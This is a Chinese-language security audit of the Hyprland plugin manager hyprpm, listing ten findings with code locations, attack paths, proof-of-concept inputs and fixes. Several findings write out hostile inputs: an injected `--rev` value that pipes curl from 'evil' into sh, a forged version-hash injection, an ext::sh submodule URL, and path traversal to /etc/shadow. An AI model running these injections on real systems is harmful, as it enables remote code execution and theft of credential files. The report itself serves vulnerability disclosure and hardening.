# Hyprland 安全审计 — hyprpm（插件管理器）

- 范围：`hyprpm/src/**`（core: PluginManager / DataState / Manifest / Plugin / HyprlandSocket；helpers: Sys / StringUtils / Die；main.cpp）
- 威胁模型：恶意插件仓库 / 恶意 hyprpm.toml 元数据 / 同机低权用户 / 网络路径（MITM）
- 备注：hyprpm 内无 fileMonitor 相关代码；元数据解析指 `hyprpm.toml`/`hyprload.toml`（toml++）与 `/var/cache/hyprpm` 状态文件。所有外部命令统一经 `execAndGet()` → `/bin/sh -c`（`hyprpm/src/core/PluginManager.cpp:36-45`），因此任何未过滤字符串进入 format 拼接即命令注入。

---

## F-PM-01 `hyprpm add --rev` 未加引号拼接进 shell —— 直接命令注入
- **严重程度：严重（Critical）**
- **位置**：`hyprpm/src/core/PluginManager.cpp:225`（`git -C {} reset --hard --recurse-submodules {}`，rev 裸插值）；过滤器 `validArg()` `hyprpm/src/core/PluginManager.cpp:139-141`（仅拒绝 `'` 与首尾 `\`）；入口 `hyprpm/src/main.cpp:107-109`。
- **攻击路径**：`rev` 在 add 流程中未加任何 shell 引号即被拼入 `sh -c` 命令。`;` `|` `&` `$()` `` ` `` 均可通过 validArg。（对比：`updatePlugins` 路径 `:735` 反而加了 `\'{}\'` 引号，说明 225 行为回归/遗漏。）
- **PoC**：`hyprpm add https://github.com/legit/repo --rev 'a;curl http://evil/x.sh|sh'`，在 Y/n 提示后确认，克隆成功即在用户上下文执行任意命令（此时尚未解析 manifest、尚未受"信任作者"约束之外的任何检查）。
- **影响**：任何诱导用户执行带恶意 `--rev` 的 hyprpm 命令（复制粘贴攻击、脚本、文档投毒）即得用户级 RCE。
- **修复建议**：rev 用单引号包裹并强制十六进制校验（复用 `isValidHash`，`PluginManager.cpp:59-61`），或改用 `CProcess` 参数数组不经 shell。

## F-PM-02 manifest `repository.name` 完全未过滤 → sudo mkdir/install 任意路径穿越（root 任意文件写）
- **严重程度：严重（Critical）**
- **位置**：`hyprpm/src/core/Manifest.cpp:64`（`m_repository.name` 无 `validManifestName` 校验，对比插件键名 `:91` 有校验）；使用点 `hyprpm/src/core/PluginManager.cpp:370`（`repo.name = manifest name`）→ `hyprpm/src/core/DataState.cpp:85-91`（`getDataStatePath() / repo.name` 交给 `NSys::root::createDirectory`，即 `sudo mkdir -p -m 755`，`hyprpm/src/helpers/Sys.cpp:124-134`）与 `DataState.cpp:122`（`writeState` → `sudo install -m644 -o0 -g0 <attacker-controlled toml> <PATH>/state.toml`，`Sys.cpp:154-164`）。`verifyStringValid`（`Sys.cpp:87-89`）只挡 `` ` $ ( ) ' " ``，**不挡 `/`、`..`**；且 `std::filesystem::path::operator/` 遇绝对路径会整体替换前缀。
- **攻击路径**：恶意插件仓库在 `hyprpm.toml` 写 `[repository] name = "/home/victim/.config/hyprpm/x"` 或 `"../../<otheruser>"`。hyprpm 以 root 创建任意目录、并把攻击者可控内容的 TOML（url/author/插件名键均取自 manifest）以 root 身份写到文件系统任意可写位置。写入他人 `/var/cache/hyprpm/<otheruser>/<repo>/state.toml` 后，受害者下次 `hyprpm update` 会克隆攻击者 `repository.url` 并用恶意 manifest 的 build steps 构建（`PluginManager.cpp:724, 834-842`）→ 跨用户 RCE；写坏系统配置/计划任务文件可进一步谋取 root。
- **PoC**：fork 任一官方插件仓库，manifest 设 `name="../../evil"`；诱骗目标用户 `hyprpm add` 你的 URL；检查 `/var/cache/hyprpm/evil/state.toml` 以 root:root 644 出现。
- **影响**：root 身份任意目录创建 + root 拥有的近似任意文件写入（内容部分可控）；同机横向 RCE。
- **修复建议**：对 `repository.name` 套用 `validManifestName`（顺带移除其中多余的 `=`），并在 DataState 侧对最终路径做 `lexically_normal` + `starts_with(getDataStatePath())` 约束。

## F-PM-03 headers 更新：以 root 构建/安装未验证的克隆源码；version JSON 裸插值
- **严重程度：高（High）**
- **位置**：`hyprpm/src/core/PluginManager.cpp:632-639`（`make -C '{}' installheaders && chmod ...` 经 `NSys::root::runAsSuperuserUnsafe` `hyprpm/src/helpers/Sys.cpp:166-172` = `sudo /bin/sh -c`）；克隆 `:542-547`（`HL_URL` 可被 `--hl-url` 任意替换，`main.cpp:71-77`，无签名/无官方域名强制）；checkout `:563`、`:575`（`git checkout {}` / `reset --hard ... {}`，`HLVER.hash` **未加引号**）；日期 `:537`（`date --date='{} - 1 weeks'` 单引号内但 `'` 未转义）；`cmake` PREFIX `:590-593`；`sed -i` 改 Makefile `:626`。
- **攻击路径**：`HLVER` 来自 Hyprland socket `j/version`（`HyprlandSocket.cpp:47-101`，socket 路径由 `XDG_RUNTIME_DIR`/`HYPRLAND_INSTANCE_SIGNATURE` 环境变量拼出，可被环境操纵指向伪造 socket）或 `Hyprland --version-json`（PATH 可劫持）。伪造 JSON 的 `commit` 字段如 `abc;curl evil|sh` 直接注入 `git checkout`/`git reset`；随后同一流程以 root 执行 `make installheaders` 构建克隆源码 —— 一旦克隆源可控（`--hl-url` 指到攻击者仓库、或对 `git://`/`http://` URL 的 MITM），root 上下文构建即提权。全程无 tag 验签、无固定 commit。
- **PoC**：设置 `HYPRLAND_INSTANCE_SIGNATURE` 指向自建监听器返回恶意 version JSON，运行 `hyprpm update`，观察注入命令执行；验证 `--hl-url` 路径 root 构建任意 Makefile。
- **影响**：本地提权至 root（条件：可控版本信息或克隆源）。
- **修复建议**：hash 复用 `isValidHash` 校验 + 引号；HL_URL 白名单（仅 https github.com/hyprwm/Hyprland，`--hl-url` 需二次确认）；headers 安装改为固定文件清单 + `install(2)` 而非 root 跑 make。

## F-PM-04 插件获取无完整性/签名校验；repo.hash 不作为固定基准（MITM 可换码）
- **严重程度：高（High）**
- **位置**：`hyprpm/src/core/PluginManager.cpp:217`（`git clone --recursive '{}' {url}`，无 scheme 白名单）、`:724`（update 重新克隆 state 中的 url）、`:746-751`（`hash != repo.hash` 仅用于"是否需要更新"的启发式，从不验证克隆内容与 state 记录一致）；build steps 原样执行 `:834-842`、`hyprpm/src/core/Manifest.cpp:51-56/114-119`（任意 shell）。
- **攻击路径**：(a) 网络位置攻击者对 `http://`/`git://` 插件 URL（无强制 https、无 GPG/minisign/tag 校验）在 `hyprpm update` 时投递不同 HEAD —— hash 变化只会"触发更新"，恶意代码照常构建并 `sudo install` 进缓存（`DataState.cpp:106-107`），随后经 socket 被 Hyprland dlopen（`PluginManager.cpp:1039-1065`）。(b) URL 未做 scheme 白名单，`ext::sh -c ...` 形式使 git 自身执行命令。(c) 免责声明仅首次弹出（`PluginManager.cpp:163-171`），update 全程零交互。
- **PoC**：在受害者网段用 `git://` mirror 替换插件仓库 HEAD，等待/触发 `hyprpm update`。
- **影响**：远程代码加载进 Hyprland 进程（键鼠捕获级权限）；克隆时 RCE。
- **修复建议**：update 时验证新 HEAD 的 git 签名 tag 或与 state.hash 做快进校验；URL scheme 白名单 + `GIT_ALLOW_PROTOCOL=https:git:ssh` 环境；对 build 产物记录哈希。

## F-PM-05 递归克隆/`submodule update --init` 盲信 `.gitmodules` —— 确认门之外的克隆期 RCE
- **严重程度：高（High）**
- **位置**：`hyprpm/src/core/PluginManager.cpp:217`（`--recursive`）、`:230`、`:293`、`:724`、`:866`（`git pull --recurse-submodules`）；无任何 `-c submodule.* ` / `protocol.ext.allow=never` 加固，无 `--no-checkout`。
- **攻击路径**：恶意插件仓库的 `.gitmodules` 声明 `submodule.x.url = ext::sh -c 'touch${IFS}/tmp/pwned'`（或 CVE-2024-32002 式 `.git/config` 符号链接），克隆阶段即以用户身份执行任意命令 —— 发生在用户审阅插件代码、构建之前，甚至 `add` 的 Y/n 确认并不能提示 submodule 风险。
- **PoC**：发布含上述 `.gitmodules` 的仓库，诱导 `hyprpm add`。
- **影响**：用户级 RCE（先于任何代码审查）；插件"作者可信"模型被绕过（submodule 可指向第三方）。
- **修复建议**：clone 用 `-c protocol.ext.allow=never --no-checkout`，submodule URL 逐一校验为 https 白名单后再 init。

## F-PM-06 manifest `output` 字段无路径校验 → `sudo install` 任意文件读取（root 复制到全局可读）
- **严重程度：中高（Medium-High）**
- **位置**：`hyprpm/src/core/Manifest.cpp:40/102`（`output` 未过滤）；使用点 `hyprpm/src/core/PluginManager.cpp:344/848`（存在性检查，文件存在即算"构建成功"）、`:376/877`（`{WORKDIR}/{output}` 拼接为 filename）、`hyprpm/src/core/DataState.cpp:103-109`（`sudo install -m0755 -o0 -g0 <p.filename> /var/cache/hyprpm/.../<name>.so`）。
- **攻击路径**：manifest 设 `output = "../../../../etc/shadow"`（或同机其他用户 0600 私钥等），无需真的构建产物 —— `:344` 的 `exists()` 对目标文件成立即可，随后 root 代为读取该文件并写成 0755 的 `<name>.so`。
- **PoC**：恶意仓库 `output = "../../../../etc/shadow"` → `hyprpm add` → `cat /var/cache/hyprpm/$USER/<plugin>/<name>.so`。
- **影响**：以 root 读取任意文件，绕过属主权限 → 本地提权素材（shadow 爆破/私钥窃取）。
- **修复建议**：`output` 限定相对路径并 `lexically_normal` 后必须位于 WORKDIR 内；install 源文件校验为常规文件且属主为当前用户。

## F-PM-07 dlopen 路径由不可信 state 字段拼接（与 F-PM-02 链式）
- **严重程度：中（Medium）**
- **位置**：`hyprpm/src/core/PluginManager.cpp:1017、1039`（`HYPRPMPATH / repoForName(p) / p.filename`，`repoForName` 返回 state 中的 `repository.name`，`p.filename` 来自 state.toml 键值原样读取 `hyprpm/src/core/DataState.cpp:237-245`）→ `/plugin load {path}` 经 socket 交给 Hyprland dlopen（`:1062-1065`）。
- **攻击路径**：任何能落盘伪造/被篡改的 state.toml（配合 F-PM-02 的 root 任意写，或 headersRoot/cache 目录权限变化）即可让 Hyprland 以 compositor 身份 dlopen 攻击者指定路径的 .so。插件名来自 `j/plugins list` 回复亦未过滤即拼路径（`:1017`）。
- **影响**：恶意机器码进入 Wayland compositor 进程（键鼠、屏幕内容全暴露）。
- **修复建议**：load 前对最终路径做 `canonical` 并强制 `starts_with("/var/cache/hyprpm/<user>/")` 且属主 root、权限 0444/0755。

## F-PM-08 headersValid 依赖 pkgconf 输出的可写路径与版本头 —— 头文件替换劫持插件构建
- **严重程度：中（Medium）**
- **位置**：`hyprpm/src/core/PluginManager.cpp:419-446`（从 `pkgconf --cflags` 输出取第一个 `-I/` 路径拼 `/hyprland/src/version.h` 读取并与运行版本比对）；`PKG_CONFIG_PATH` 含 `$PKG_CONFIG_PATH` 透传（`:1156-1158`）；headers 安装后 `chmod -R 644`+ 目录 `a+x`（`:632`）。
- **攻击路径**：插件构建完全信任 headersRoot 中头文件内容；version.h 只要哈希匹配即可，其余头文件可被替换（同用户进程在 chmod 窗口、或伪造 pc 文件改变 -I 搜索顺序指向可写目录）。恶意头文件（inline 函数、宏）可在不触发 Hyprland 侧任何校验的情况下把后门编进插件 .so —— 而该 .so 将以 root 安装、compositor 加载。
- **影响**：绕过"审阅插件源码"信任模型，实现持久化恶意代码加载。
- **修复建议**：对 headersRoot 建立清单+哈希（安装时生成，构建前校验）；pkgconf 调用固定 `PKG_CONFIG_PATH`（不透传外部值）。

## F-PM-09 TOCTOU / 竞态集合（低危但应加固）
- **严重程度：低（Low）**
- **位置**：
  - `hyprpm/src/core/PluginManager.cpp:127-134` `createSafeDirectory`：`remove_all` 后再 `mkdir`，非 `O_EXCL`/`mkdirat`；同 uid 并发进程或异常残留的符号链接可在窗口期占位（WORKDIR 位于 `$XDG_RUNTIME_DIR/hyprpm`，`DataState.cpp:12-25` 的 `getTempRoot` 对已存在目录不收紧权限、不拒绝符号链接）。
  - `hyprpm/src/core/DataState.cpp:28-38` `writeState`：固定文件名 `.temp-state`，并发 hyprpm 实例互相覆盖后再 `install`（可写他人实例内容被 root 提升落盘）。
  - `hyprpm/src/helpers/Sys.cpp:141-151` `removeRecursive`：`canonical()` 校验与 root `rm -fr` 之间存在理论 TOCTOU（目录 root 属主缓解了同机利用）。
  - `hyprpm/src/core/HyprlandSocket.cpp:55-65`：socket 路径直接信任 `HYPRLAND_INSTANCE_SIGNATURE`/`XDG_RUNTIME_DIR`，未校验 HIS 字符集（`../` 可穿越运行时目录）。
- **PoC 思路**：并发两个 hyprpm 实例交错 `writeState`；或伪造 HIS=`../../attacker` 劫持 socket 连接投递假 `j/version`（喂给 F-PM-03）。
- **修复建议**：`mkdtemp` 式唯一目录；temp 文件用 `mkstemp` + 校验属主；HIS 白名单 `[A-Za-z0-9_-]`。

## F-PM-10 其他设计面（信息级，Informational）
- **位置/说明**：
  - `hyprpm/src/core/Manifest.cpp:51-56/114-119`：build steps 为任意 shell，仓库确认仅一次 Y/n 且免责声明只弹一次（`PluginManager.cpp:163-171`）——"审阅代码"完全依赖人工，建议 update 时对 diff 提示。
  - `hyprpm/src/core/Manifest.cpp:8`：`validManifestName` 允许 `=`，插件名以 `.so` 落盘/加载时可出现在非预期位置语义（低风险）。
  - `hyprpm/src/helpers/Sys.cpp:41-63` `findInPath`：`sudo` 解析仅要求 others 可执行，PATH 被污染时可指向仿冒 `sudo`（需同机写 PATH 权限，缓解：对 sudo/doas/run0 用绝对路径+完整性校验）。
  - `hyprpm/src/main.cpp:64`：`--notify-fail` 分支未初始化 `g_pPluginManager` 即调用 `notify()`（空指针解引用崩溃，DoS 级 bug）。
  - `hyprpm/src/core/PluginManager.cpp:59-61`：`isValidHash` 未限长度（pin 场景影响小）。

---

### 汇总
| ID | 标题 | 严重程度 |
|---|---|---|
| F-PM-01 | `--rev` 未引号拼接 → shell 命令注入 | 严重 |
| F-PM-02 | `repository.name` 未过滤 → root mkdir/install 任意路径 | 严重 |
| F-PM-03 | headers：root 构建未验证克隆源 + JSON 裸插值 | 高 |
| F-PM-04 | 插件获取无签名/哈希固定（MITM 换码、ext:: URL） | 高 |
| F-PM-05 | `.gitmodules` 盲信 → 确认门外克隆期 RCE | 高 |
| F-PM-06 | manifest `output` 路径穿越 → root 任意文件读 | 中高 |
| F-PM-07 | dlopen 路径来自不可信 state 拼接 | 中 |
| F-PM-08 | headers 信任 pkgconf/文件内容可被替换 | 中 |
| F-PM-09 | TOCTOU/竞态集合（temp 文件、mkdir、HIS） | 低 |
| F-PM-10 | 设计面与信息级问题 | 信息 |
